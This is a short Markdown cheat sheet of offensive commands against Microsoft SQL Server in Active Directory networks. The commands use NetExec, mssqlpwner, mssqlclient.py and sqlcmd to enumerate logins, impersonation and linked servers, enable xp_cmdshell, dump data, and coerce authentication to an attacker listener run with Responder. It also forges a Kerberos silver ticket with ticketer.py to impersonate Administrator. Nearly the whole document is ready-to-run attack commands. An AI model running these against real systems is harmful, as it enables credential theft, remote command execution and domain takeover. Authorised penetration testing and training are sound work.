# mssql
#target/remote #os/linux #cat/ad #proto/mssql #port/1433

## nxc mssql connect
```
nxc mssql <ip> -u '<user>' -p '<password>'

nxc mssql <ip> -u '<user>' -p '<password>' --local-auth

nxc mssql <ip> -u '<user>' -p '<password>' -d ''
```

## mssql all in one (expects responder)
```
nxc mssql <ip> -u '<user>' <auth> -q "SELECT sp.name, sl.name AS LoginName FROM sys.server_role_members rm JOIN sys.server_principals sp ON rm.role_principal_id = sp.principal_id JOIN sys.server_principals sl ON rm.member_principal_id = sl.principal_id WHERE sp.name = 'sysadmin';" --rid-brute 10000 --list-backups -M enum_impersonate -M enum_links -M enum_logins -M mssql_cbt -M mssql_dumper -M enable_cmdshell -M mssql_coerce -M mssql_priv -o ACTION=enable L=<lhost>

mssqlpwner <domain>/'<user>'<impacket_target_auth> -windows-auth -auto-yes interactive
```

## mssqlclient.py
```
mssqlclient.py <domain>/'<user>'<impacket_target_auth> -windows-auth
```

## mssql coerce (expects responder)
```
nxc mssql 10.129.242.173 -u '<user>' <auth> -M mssql_coerce -o L=<lhost>
```

## mssql enum (expects responder)
```
sqlcmd -C -S <fqdn> <auth> -y30 -Y30 -i ~/staging/enum.sql -v LHOST=<lhost>
```

## mssql service account exploitation
```
ticketer.py -spn MSSQLSvc/<fqdn>:1433 -domain-sid <domain_sid> -nthash <nt_hash> -domain <domain> -user-id <imp_user_id|500> <imp_user|Administrator> && export KRB5CCNAME=$(pwd)/<imp_user>.ccache && mssqlclient.py -k -no-pass -windows-auth <fqdn>
```

## mssql query
```
nxc mssql <ip> -u '<user>' <auth> -q '<mssql_query>'
```
